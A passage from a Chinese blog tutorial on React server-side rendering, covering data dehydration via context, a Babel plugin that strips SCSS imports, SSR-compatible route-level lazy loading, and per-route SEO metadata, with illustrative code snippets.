class="line"></span><br></pre></td></tr></table></figure>

<p>需要借助 ejs 模板，将数据绑定到页面上，为了防止 XSS攻击，这里我把数据写到了 textarea 标签里。</p>
<p>下图中，我看着明文数据难受，对数据做了base64编码 ，用之前需要转码，看个人需要。<br><img src="https://upload-images.jianshu.io/upload_images/10024246-4ea344d1832c1cca.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image"></p>
<h3 id="数据脱水"><a href="#数据脱水" class="headerlink" title="数据脱水"></a>数据脱水</h3><p>上一步数据已经注入到了浏览器端，这一步要在客户端组件渲染前先拿到数据，并且传入组件就可以了。</p>
<p>客户端可以直接使用id=krs-server-render-data-BOX 进行数据获取。</p>
<p>第一个方法简单粗暴，可直接在组件内的constructor 构造函数 内进行获取，如果怕代码重复，可以写一个高阶组件。</p>
<p>第二个方法可以通过 context 传递，只需要在入口处传入，在组件中声明 static contextType 即可。</p>
<p>我是采用context 传递，为了后面方便集成 redux 状态管理 。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F; 定义 context 生产者 组件</span><br><span class="line"></span><br><span class="line">import React,&#123;createContext&#125; from &#39;react&#39;;</span><br><span class="line">import RootContext from &#39;.&#x2F;route-context&#39;;</span><br><span class="line"></span><br><span class="line">export default class Index extends React.Component &#123;</span><br><span class="line">    constructor(props,context) &#123;</span><br><span class="line">        super(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        return &lt;RootContext.Provider value&#x3D;&#123;this.props.initialData||&#123;&#125;&#125;&gt;</span><br><span class="line">            &#123;this.props.children&#125;</span><br><span class="line">        &lt;&#x2F;RootContext.Provider&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;入口  app.js</span><br><span class="line">import React from &#39;react&#39;;</span><br><span class="line">import ReactDOM from &#39;react-dom&#39;;</span><br><span class="line">import &#123; BrowserRouter &#125; from &#39;react-router-dom&#39;;</span><br><span class="line">import Routes from &#39;..&#x2F;&#39;;</span><br><span class="line">import Provider from &#39;.&#x2F;provider&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;渲染入口  接收脱水数据</span><br><span class="line">function renderUI(initialData) &#123;</span><br><span class="line">    ReactDOM.hydrate(&lt;BrowserRouter&gt;&lt;Provider initialData&#x3D;&#123;initialData&#125;&gt;</span><br><span class="line">        &lt;Routes &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;Provider&gt;</span><br><span class="line">    &lt;&#x2F;BrowserRouter&gt;, document.getElementById(&#39;rootEle&#39;), (e) &#x3D;&gt; &#123;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;函数执行入口</span><br><span class="line">function entryIndex() &#123;</span><br><span class="line">    let APP_INIT_DATA &#x3D; &#123;&#125;;</span><br><span class="line">    let state &#x3D; true;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;取得数据</span><br><span class="line">    let stateText &#x3D; document.getElementById(&#39;krs-server-render-data-BOX&#39;);</span><br><span class="line"></span><br><span class="line">    if (stateText) &#123;</span><br><span class="line">        APP_INIT_DATA &#x3D; JSON.parse(stateText.value || &#39;&#123;&#125;&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (APP_INIT_DATA) &#123;&#x2F;&#x2F;客户端渲染</span><br><span class="line"></span><br><span class="line">        renderUI(APP_INIT_DATA);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;入口执行</span><br><span class="line">entryIndex();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>行文至此，核心的内容已经基本说完，剩下的就是组件内如何使用脱水的数据。</p>
<p>下面通过 context 拿到数据 , 代码仅供参考，可根据自己的需求来进行封装和调整。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &#39;react&#39;;</span><br><span class="line">import &#39;.&#x2F;css&#x2F;index.scss&#39;;</span><br><span class="line"></span><br><span class="line">export default class Index extends React.Component &#123;</span><br><span class="line"></span><br><span class="line">    constructor(props, context) &#123;</span><br><span class="line">        super(props, context);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;将context 存储到 state </span><br><span class="line">        this.state &#x3D; &#123;</span><br><span class="line">            ... context</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;设置此参数 才能拿到 context 数据</span><br><span class="line">    static contextType &#x3D; RootContext;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;数据预取方法</span><br><span class="line">    static async getInitialProps(krsOpt) &#123;</span><br><span class="line"></span><br><span class="line">        if (__SERVER__) &#123;</span><br><span class="line">            &#x2F;&#x2F;如果是服务端渲染的话  可以做的处理,node 端设置的全局变量</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const fetch1 &#x3D; fetch.postForm(&#39;&#x2F;fe_api&#x2F;filed-manager&#x2F;get-detail-of-type&#39;, &#123;</span><br><span class="line">            data: &#123; ofTypeId: 4000 &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        const fecth2 &#x3D; fetch.postForm(&#39;&#x2F;fe_api&#x2F;filed-manager&#x2F;get-detail-of-type&#39;, &#123;</span><br><span class="line">            data: &#123; ofTypeId: 2000 &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        const resArr &#x3D; await fetch.multipleFetch(fetch1, fecth2);</span><br><span class="line">        &#x2F;&#x2F;返回所有数据</span><br><span class="line">        return &#123;</span><br><span class="line">            page: &#123;&#125;,</span><br><span class="line">            fetchData: resArr</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    componentDidMount() &#123;</span><br><span class="line">        if (!this.isSSR) &#123; &#x2F;&#x2F;非服务端渲染需要自身进行数据获取</span><br><span class="line">            Index.getInitialProps(this.props.krsOpt).then(data &#x3D;&gt; &#123;</span><br><span class="line">                this.setState(&#123;</span><br><span class="line">                    ...data</span><br><span class="line">                &#125;, () &#x3D;&gt; &#123;</span><br><span class="line">                   &#x2F;&#x2F;可有的一些操作</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;得到 state 内的数据，进行逻辑判断和容错，然后渲染</span><br><span class="line">        const &#123; page, fetchData &#125; &#x3D; this.state;</span><br><span class="line">        const [res] &#x3D; fetchData || [];</span><br><span class="line"></span><br><span class="line">        return &lt;div className&#x3D;&quot;detailBox&quot;&gt;</span><br><span class="line">            &#123;</span><br><span class="line">                res &amp;&amp; res.data.map(item &#x3D;&gt; &#123;</span><br><span class="line">                    return &lt;div key&#x3D;&#123;item.id&#125;&gt;&#123;item.keyId&#125;:&#123;item.keyName&#125;---&#123;item.setContent&#125;&lt;&#x2F;div&gt;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>到此我们的第三个问题：【服务端 html 节点无法重用 】已经解决,但人不够完美，请继续看。</p>
<h1 id="css-过滤"><a href="#css-过滤" class="headerlink" title="css 过滤"></a>css 过滤</h1><p>我们在写组件的时候大部分都会导入相关的 css 文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import &#39;.&#x2F;css&#x2F;index.scss&#39;;&#x2F;&#x2F;导入css</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;组件</span><br><span class="line">class Index extends React.Component&#123;</span><br><span class="line">    constructor(props)&#123;</span><br><span class="line">        super(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static async  getInitialProps() &#123;</span><br><span class="line">        const fetch1 &#x3D;await fetch(&#39;&#x2F;xxx.com&#x2F;a&#39;);</span><br><span class="line">        const fetch2 &#x3D; await fetch(&#39;&#x2F;xxx.com&#x2F;b&#39;);</span><br><span class="line"></span><br><span class="line">        return &#123;</span><br><span class="line">            res:[fetch1,fetch2]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render()&#123;</span><br><span class="line">        return &lt;h1&gt;&#123;this.props.data.title&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这个 css 文件在服务端无法执行，其实想想在服务端本来就不需要渲染 css 。为什么不直接干掉？ 所以为了方便，我这里写了一个babel 插件，在编译的时候干掉 css 的导入代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 删除 css 的引入</span><br><span class="line"> * 可能社区已经有现成的插件但是不想费劲儿找了，还是自己写一个吧。 </span><br><span class="line"> *&#x2F;</span><br><span class="line">module.exports &#x3D; function (&#123; types: babelTypes &#125;) &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">        name: &quot;no-require-css&quot;,</span><br><span class="line">        visitor: &#123;</span><br><span class="line">            ImportDeclaration(path, state) &#123;</span><br><span class="line">                let importFile &#x3D; path.node.source.value;</span><br><span class="line">                if(importFile.indexOf(&#39;.scss&#39;)&gt;-1)&#123;</span><br><span class="line">                    &#x2F;&#x2F; 干掉css 导入</span><br><span class="line">                    path.remove();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;.babelrc 中使用</span><br><span class="line"></span><br><span class="line"> &quot;plugins&quot;: [</span><br><span class="line">                &quot;.&#x2F;webpack&#x2F;babel&#x2F;plugin&#x2F;no-require-css&quot;  &#x2F;&#x2F;引入        </span><br><span class="line">            ]</span><br></pre></td></tr></table></figure>

<p><a href="https://www.renrenfan.com.cn/">资源搜索网站大全</a> <a href="https://www.renrenfan.com.cn/">https://www.renrenfan.com.cn</a> <a href="https://www.houdianzi.com/">广州VI设计公司</a><a href="https://www.houdianzi.com/">https://www.houdianzi.com</a></p>
<h1 id="动态路由的-SSR"><a href="#动态路由的-SSR" class="headerlink" title="动态路由的 SSR"></a>动态路由的 SSR</h1><p>现在要说一个更加核心的内容，也是本文的一个压轴亮点，可以说是<strong>全网唯一</strong>,我之前也看过很多文章和资料都没有细说这一块儿的实现。</p>
<p>不知道你有没有发现，上面我们已经一步一步的实现了 React SSR 同构 的完整流程，但是总感觉少点什么东西。</p>
<p>SPA模式下大部分都会实现组件分包和按需加载，防止所有代码打包在一个文件过大影响页面的加载和渲染，影响用户体验。</p>
<p>那么基于 SSR 的组件按需加载如何实现呢？</p>
<p>当然我们所限定按需的粒度是路由级别的，请求不同的路由动态加载对应的组件。</p>
<h2 id="如何实现组件的按需加载？"><a href="#如何实现组件的按需加载？" class="headerlink" title="如何实现组件的按需加载？"></a>如何实现组件的按需加载？</h2><p>在 webpack2 时期主要使用require.ensure方法来实现按需加载，他会单独打包指定的文件，在当下 webpack4，有了更加规范的的方式实现按需加载，那就是动态导入 import(‘./xx.js’),当然实现的效果和 require.ensure是相同的。</p>
<p>咱们这里只说如何借助这个规范实现按需加载的路由，关于动态导入的实现原理先按下不表。</p>
<p>我们都知道 import 方法传入一个js文件地址，返回值是一个 promise 对象，然后在 then 方法内回调得到按需的组件。他的原理其实就是通过 jsonp 的方式，动态请求脚本，然后在回调内得到组件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import(&#39;..&#x2F;index&#39;).then(res&#x3D;&gt;&#123;</span><br><span class="line">    &#x2F;&#x2F;xxxx</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>那现在我们已经得到了几个比较有用的信息。</p>
<ul>
<li>  如何加载脚本 - import 结合 webpack 自动完成</li>
<li>  脚本是否加载完成 - 通过在 then 方法回调进行处理</li>
<li>  获取异步按组件 - 通过在 then 方法回调内获取</li>
</ul>
<p>我们可以试着把上面的逻辑抽象成为一个组件，然后在路由配置的地方进行导入后，那么是不是就完成了组件的按需加载呢？</p>
<p>先看下按需加载组件, 目的是在 import 完成的时候得到按需的组件，然后更改容器组件的 state，将这个异步组件进行渲染。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"> * 按需加载的容器组件</span><br><span class="line"> * @class Bundle</span><br><span class="line"> * @extends &#123;Component&#125;</span><br><span class="line"> *&#x2F;</span><br><span class="line">export default class Async extends React.Component &#123;</span><br><span class="line">    constructor(props) &#123;</span><br><span class="line">        super(props);</span><br><span class="line">        this.state &#x3D; &#123;</span><br><span class="line">            COMPT: null</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    UNSAFE_componentWillMount() &#123;</span><br><span class="line">        &#x2F;&#x2F;执行组件加载</span><br><span class="line">        if (!this.state.COMPT) &#123;</span><br><span class="line">            this.load(this.props);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    load(props) &#123;</span><br><span class="line">        this.setState(&#123;</span><br><span class="line">            COMPT: null</span><br><span class="line">        &#125;);</span><br><span class="line">        &#x2F;&#x2F;注意这里，返回Promise对象; C.default 指向按需组件</span><br><span class="line">        props.load().then((C) &#x3D;&gt; &#123;</span><br><span class="line">            this.setState(&#123;</span><br><span class="line">                COMPT: C.default ? C.default : COMPT</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        return this.state.COMPT ? this.props.children(this.state.COMPT) : &lt;span&gt;正在加载......&lt;&#x2F;span&gt;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Async 容器组件接收一个 props 传过来的 load 方法，返回值是 Promise类型，用来动态导入组件。</p>
<p>在生命周期 UNSAFE_componentWillMount 得到按需的组件，并将组件存储到 state.COMPT内,同时在 render 方法中判断这个状态的可用性，然后调用this.props.children 方法进行渲染。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;调用</span><br><span class="line">const LazyPageCom &#x3D; (props) &#x3D;&gt; (</span><br><span class="line">    &lt;Async load&#x3D;&#123;() &#x3D;&gt; import(&#39;..&#x2F;index&#39;)&#125;&gt;</span><br><span class="line">        &#123;(C) &#x3D;&gt; &lt;C &#123;...props&#125; &#x2F;&gt;&#125;&#x2F;&#x2F;返回函数组件</span><br><span class="line">    &lt;&#x2F;Async&gt;</span><br><span class="line">);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然这只是其中一种方法，也有很多是通过 react-loadable 库来进行实现，但是实现思路基本相同,有兴趣的可以看下源码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;参考代码</span><br><span class="line">import React from &#39;react&#39;;</span><br><span class="line">import Loadable from &#39;react-loadable&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;loading 组件</span><br><span class="line">const Loading &#x3D;()&#x3D;&gt;&#123;</span><br><span class="line">    return (</span><br><span class="line">        &lt;div&gt;loading&lt;&#x2F;div&gt;</span><br><span class="line">    ) </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;导出组件</span><br><span class="line">export default Loadable(&#123;</span><br><span class="line">    loader:import(&#39;..&#x2F;index&#39;),</span><br><span class="line">    loading:Loading</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>到这里我们已经实现了组件的按需加载，剩下就是配置到路由。</p>
<p>看下伪代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;index.js</span><br><span class="line"></span><br><span class="line">class Index extends React.Component &#123;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        return &lt;div&gt;detail&lt;&#x2F;div&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;detail.js</span><br><span class="line"></span><br><span class="line">class Detail extends React.Component &#123;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        return &lt;div&gt;detail&lt;&#x2F;div&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;routes.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;按需加载 index 组件</span><br><span class="line">const AyncIndex &#x3D; (props) &#x3D;&gt; (</span><br><span class="line">    &lt;Async load&#x3D;&#123;() &#x3D;&gt; import(&#39;..&#x2F;index&#39;)&#125;&gt;</span><br><span class="line">        &#123;(C) &#x3D;&gt; &lt;C &#123;...props&#125; &#x2F;&gt;&#125;</span><br><span class="line">    &lt;&#x2F;Async&gt;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;按需加载 detai 组件</span><br><span class="line">const AyncDetail &#x3D; (props) &#x3D;&gt; (</span><br><span class="line">    &lt;Async load&#x3D;&#123;() &#x3D;&gt; import(&#39;..&#x2F;index&#39;)&#125;&gt;</span><br><span class="line">        &#123;(C) &#x3D;&gt; &lt;C &#123;...props&#125; &#x2F;&gt;&#125;</span><br><span class="line">    &lt;&#x2F;Async&gt;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">const routes &#x3D; [</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        path: &quot;&#x2F;&quot;,</span><br><span class="line">        exact: true,</span><br><span class="line">        component: AyncIndex</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        path: &#39;&#x2F;detail&#39;, exact: true,</span><br><span class="line">        component: AyncDetail,</span><br><span class="line">    &#125;</span><br><span class="line">];</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>结合路由的按需加载已经配置完成，先不管 server端 是否需要进行调整，此时的代码是可以运行的，按需也是 ok 的。</p>
<p>但是ssr无效了，查看网页源代码无内容。</p>
<h2 id="动态路由-SSR-双端配置"><a href="#动态路由-SSR-双端配置" class="headerlink" title="动态路由 SSR 双端配置"></a>动态路由 SSR 双端配置</h2><p>ssr无效了,这是什么原因呢？</p>
<p>上面我们在做路由同构的时候，双端使用的是同一个 route配置文件routes-config.js,现在组件改成了按需加载，所以在路由查找后得到的组件发生改变了 - AyncDetail,AyncIndex，根本无法转换出组件内容。</p>
<h3 id="ssr-模式下-server-端如何处理路由按需加载"><a href="#ssr-模式下-server-端如何处理路由按需加载" class="headerlink" title="ssr 模式下 server 端如何处理路由按需加载"></a>ssr 模式下 server 端如何处理路由按需加载</h3><p>其实很简单，也是参考客户端的处理方式，对路由配置进行二次处理。server 端在进行组件查找前，强制执行 import 方法，得到一个全新的静态路由表，再去进行组件的查找。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&#x2F;&#x2F;获得静态路由</span><br><span class="line"></span><br><span class="line">import routes from &#39;routes-config.js&#39;;&#x2F;&#x2F;得到动态路由的配置</span><br><span class="line"></span><br><span class="line">export async function getStaticRoutes() &#123;</span><br><span class="line"></span><br><span class="line">    const staticRoutes &#x3D; [];&#x2F;&#x2F;存放新路由</span><br><span class="line"></span><br><span class="line">    for (; i &lt; len; i++) &#123;</span><br><span class="line">        let item &#x3D; routes[i];</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F;存放静态路由</span><br><span class="line">        staticRoutes.push(&#123;</span><br><span class="line">            ...item,</span><br><span class="line">            ...&#123;</span><br><span class="line">                component: (await item.component().props.load()).default</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return staticRoutes; &#x2F;&#x2F;返回静态路由</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如今我们离目标更近了一步，server端已兼容了按需路由的查找。但是还没完！</p>
<p>我们这个时候访问页面的话，ssr 生效了，查看网页源代码可以看到对应的 html 内容。</p>
<p>但是页面上会显示直出的内容，然后显示<span>正在加载……</span> ,瞬间又变成直出的内容。</p>
<h3 id="ssr-模式下-client-端如何处理路由按需加载"><a href="#ssr-模式下-client-端如何处理路由按需加载" class="headerlink" title="ssr 模式下 client 端如何处理路由按需加载"></a>ssr 模式下 client 端如何处理路由按需加载</h3><p>这个是为什么呢？</p>
<p>是不是看的有点累了，再坚持一下就成功了。</p>
<p>其实有问题才是最好的学习方式，问题解决了，路就通了。</p>
<p>首先我们知道浏览器端会对已有的节点进行双端对比，如果对比失败就会重新渲染，这很明显就是个问题。</p>
<p>咱分析一下，首先服务端直出了 html 内容，而此时浏览器端js执行完后需要做按需加载，在按需加载前的组件默认的内容就是<span>正在加载……</span> 这个缺省内容和服务端直出的 html 内容完全不同，所以对比失败，页面会渲染成 <span>正在加载……</span>,然后按需加载完成后组件再次渲染，此时渲染的就是真正的组件了。</p>
<p><strong>如何解决呢？</strong></p>
<p>其实也并不复杂，只是不确定是否可行，试过就知道。</p>
<p>既然客户端需要处理按需，那么我们等这个按需组件加载完后再进行渲染是不是就可以了呢？</p>
<p>答案是：可以的！</p>
<p><strong>如何按需呢？</strong></p>
<p>向“服务端同学”学习，找到对应的组件并强制 执行import按需，只是这里不是转换为静态路由，只找到按需的组件完成动态加载即可。</p>
<p>既然有了思路，那就撸起代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import React,&#123;createContext&#125; from &#39;react&#39;;</span><br><span class="line">import RootContext from &#39;.&#x2F;route-context&#39;;</span><br><span class="line"></span><br><span class="line">export default class Index extends React.Component &#123;</span><br><span class="line">    constructor(props,context) &#123;</span><br><span class="line">        super(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render() &#123;</span><br><span class="line">        return &lt;RootContext.Provider value&#x3D;&#123;this.props.initialData||&#123;&#125;&#125;&gt;</span><br><span class="line">            &#123;this.props.children&#125;</span><br><span class="line">        &lt;&#x2F;RootContext.Provider&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;入口  app.js</span><br><span class="line">import React from &#39;react&#39;;</span><br><span class="line">import ReactDOM from &#39;react-dom&#39;;</span><br><span class="line">import &#123; BrowserRouter &#125; from &#39;react-router-dom&#39;;</span><br><span class="line">import Routes from &#39;..&#x2F;&#39;;</span><br><span class="line">import Provider from &#39;.&#x2F;provider&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;渲染入口</span><br><span class="line">function renderUI(initialData) &#123;</span><br><span class="line">    ReactDOM.hydrate(&lt;BrowserRouter&gt;&lt;Provider initialData&#x3D;&#123;initialData&#125;&gt;</span><br><span class="line">        &lt;Routes &#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;Provider&gt;</span><br><span class="line">    &lt;&#x2F;BrowserRouter&gt;, document.getElementById(&#39;rootEle&#39;), (e) &#x3D;&gt; &#123;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function entryIndex() &#123;</span><br><span class="line">    let APP_INIT_DATA &#x3D; &#123;&#125;;</span><br><span class="line">    let state &#x3D; true;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;取得数据</span><br><span class="line">    let stateText &#x3D; document.getElementById(&#39;krs-server-render-data-BOX&#39;);</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;数据脱水</span><br><span class="line">    if (stateText) &#123;</span><br><span class="line">        APP_INIT_DATA &#x3D; JSON.parse(stateText.value || &#39;&#123;&#125;&#39;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (APP_INIT_DATA) &#123;&#x2F;&#x2F;客户端渲染</span><br><span class="line"></span><br><span class="line">        - renderUI(true, APP_INIT_DATA);</span><br><span class="line">        &#x2F;&#x2F;查找组件</span><br><span class="line">        + matchComponent(document.location.pathname, routesConfig()).then(res &#x3D;&gt; &#123;</span><br><span class="line">            renderUI(true, APP_INIT_DATA);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;执行入口</span><br><span class="line">entryIndex();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>matchComponent 是我封装的一个组件查找的方法，在文章开始已经介绍过类似的实现，代码就不贴了。</p>
<p><strong>核心亮点说完，整个流程基本结束，剩下的都是些有的没的了，我打算要收工了。</strong></p>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="SEO-支持"><a href="#SEO-支持" class="headerlink" title="SEO 支持"></a>SEO 支持</h2><p>页面的 SEO 效果取决于页面的主体内容和页面的 TDK（标题 title,描述 description,关键词 keyword）以及关键词的分布和密度，现在我们实现了 ssr所以页面的主体内容有了，那如何设置页面的标题并且让每个页面（路由）的标题都不同呢？</p>
<p>只要我们每请求一个路由的时候返回不同的 tdk 就可以了。</p>
<p>这里我在所对应组件数据预取的方法内加了约定，返回的数据为固定格式，必须包含 page 对象，page 对象内包含 tdk 的信息。</p>
<p>看代码瞬间就明白。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import &#39;.&#x2F;css&#x2F;index.scss&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;组件</span><br><span class="line">class Index extends React.Component&#123;</span><br><span class="line">    constructor(props)&#123;</span><br><span class="line">        super(props);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static async  getInitialProps() &#123;</span><br><span class="line">        const fetch1 &#x3D;await fetch(&#39;&#x2F;xxx.com&#x2F;a&#39;);</span><br><span class="line">        const fetch2 &#x3D; await fetch(&#39;&#x2F;xxx.com&#x2F;b&#39;);</span><br><span class="line"></span><br><span class="line">        return &#123;</span><br><span class="line">            page:&#123;</span><br><span class="line">                tdk:&#123;</span><br><span class="line">                    title:&#39;标题&#39;,</span><br><span class="line">                    keyword:&#39;关键词&#39;,</span><br><span class="line">                    description:&#39;描述&#39;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res:[fetch1,fetch2]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    render()&#123;</span><br><span class="line">        return &lt;h1&gt;&#123;this.props.data.title&#125;&lt;&#x2F;h1&gt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样你的 tdk 可以根据你的需要设置成静态还是从接口拿到的。然后可以在 esj 模板里进行绑定，也可以在 componentDidMount通过 js<br>document.title=this.state.page.tdk.title设置页面的标题。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">   &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1.0&quot;&gt;</span><br><span class="line">   &lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;ie&#x3D;edge&quot;&gt;</span><br><span class="line">   &lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&lt;%&#x3D;page.tdk.keyword%&gt;&quot; &#x2F;&gt;</span><br><span class="line">   &lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;content&#x3D;&quot;&lt;%&#x3D;page.tdk.description%&gt;&quot; &#x2F;&gt;</span><br><span class="line">   &lt;title&gt;&lt;%&#x3D;page.tdk.title%&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">   &lt;div id&#x3D;&quot;rootEle&quot;&gt;</span><br><span class="line">       &lt;%- htmlContent %&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;%- propsData %&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;%page.staticSource.js.forEach(function(item)&#123;%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="fetch-同构"><a href="#fetch-同构" class="headerlink" title="fetch 同构"></a>fetch 同构</h2><p>可以使用isomorphic-fetch、axios或者whatwg-fetch + node-fetch 等库来实现支持双端的 fetch 数据请求，这里推荐使用axios 主要是比较方便。</p>
<h1 id="TODO-和-思考"><a href="#TODO-和-思考" class="headerlink" title="TODO 和 思考"></a>TODO 和 思考</h1><p>没有介绍结合 redux 状态管理的 ssr 实现，其实也不复杂，关键还是看业务中是否需要使用redux，因为文中已经实现了使用 context 传递数据，直接改成按store 传递也很容易,但是更多的还是对 react-redux 的应用。</p>
